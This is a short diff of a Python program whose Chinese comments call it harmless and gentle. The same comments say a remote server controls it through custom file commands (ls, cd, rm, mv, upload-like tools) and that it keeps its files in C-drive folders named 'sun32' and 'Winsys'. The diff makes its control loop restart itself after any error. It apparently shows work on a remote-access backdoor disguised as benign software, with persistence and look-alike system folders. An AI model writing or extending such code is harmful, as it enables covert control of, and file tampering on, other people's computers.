@@ -2,6 +2,7 @@
 # -*- coding: UTF-8 -*-
 #这是一个人畜无害，相当温和，德芙般丝滑的小程序
 '''
+此程序占用的资源为 Windows C 盘符下的 sun32 以及 Winsys 文件夹
 此程序使用说明：
 	此程序由远程服务器控制，并使用自制的终端工具进行操作
 	工具包含 ls，we，cd，rm，mv，gp，up 七个工具
@@ -418,15 +419,14 @@ if __name__=='__main__':
 	size = width, height = 320, 240  # 设置窗口大小
 
 	while True:	
-		#try:
-		windows = WinControl()
-		main()
-	
-	'''
+		try:
+			windows = WinControl()
+			main()
+
 		except:
-			time.sleep(5)
+			time.sleep(10)
 			print("核心出错！进行重启！")	
-	'''
+
 
 	screen = pygame.display.set_mode(size)  # 显示窗口
 	while True:  # 死循环确保窗口一直显示
